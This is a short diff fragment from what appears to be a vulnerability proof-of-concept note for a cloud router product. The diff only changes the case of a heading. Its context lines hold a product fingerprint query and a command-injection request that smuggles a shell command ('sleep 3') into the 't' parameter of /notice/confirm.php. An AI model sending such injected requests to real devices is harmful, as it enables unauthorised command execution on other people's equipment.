@@ -8,7 +8,7 @@
 product="碧海威科技-L7云路由"
 ```
 
-## poc
+## POC
 
 ```
 GET /notice/confirm.php?t=;sleep%203 HTTP/1.1
